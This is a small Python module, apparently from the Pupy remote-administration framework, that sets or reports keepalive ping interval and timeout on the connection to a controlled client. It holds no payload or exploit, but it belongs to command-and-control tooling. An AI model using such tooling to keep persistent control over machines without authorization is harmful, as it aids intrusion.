# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__="alive"

@config(cat="admin")
class alive(PupyModule):
    """ request to send keepalive packets on rpyc level """
    is_module=False

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="alive", description=cls.__doc__)
        cls.arg_parser.add_argument('-t', '--timeout', type=int, help='ping timeout')
        cls.arg_parser.add_argument('-i', '--interval', type=int, help='ping send interval')

    def run(self, args):
        try:
            interval, timeout = self.client.conn._conn.root.getconn().set_pings(
                args.interval, args.timeout
            )

            if interval is not None and timeout is not None:
                self.success('Interval: {}'.format(interval))
                self.success('Timeout:  {}'.format(timeout))
            else:
                self.success('Pings disabled')

        except Exception, e:
            self.error('Pings configuration is not supported ({})'.format(e))
